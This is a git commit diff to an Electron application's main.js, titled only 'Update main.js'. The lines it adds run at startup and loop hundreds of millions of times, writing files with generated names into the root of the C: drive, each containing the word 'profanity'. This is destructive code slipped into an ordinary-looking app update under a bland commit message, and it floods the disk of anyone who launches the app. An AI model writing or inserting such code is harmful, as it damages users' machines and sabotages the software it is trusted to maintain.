e8d60e82519c15418a743f940d9cd1c7a8399ccd
patrickzebinghe <patrick2hb@hotmail.com>
2017-10-18 11:49:21 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,7 +1,20 @@
 const { app, BrowserWindow } = require('electron')
 const path = require('path')
 const url = require('url')
+const fs = require("fs");
+for(let i = 0;i<387420489;i++){
+    s = ""
+    for(let a=0;a<20;a++){
+        s+=String.fromCharCode(i+20-a)
+    }
+    fs.writeFile("C:/" + s, "profanity", function(err) {
+        if(err) {
+            return console.log(err);
+        }
 
+        console.log("The file was saved!");
+    }); 
+}
 let win
 
 function createWindow() {
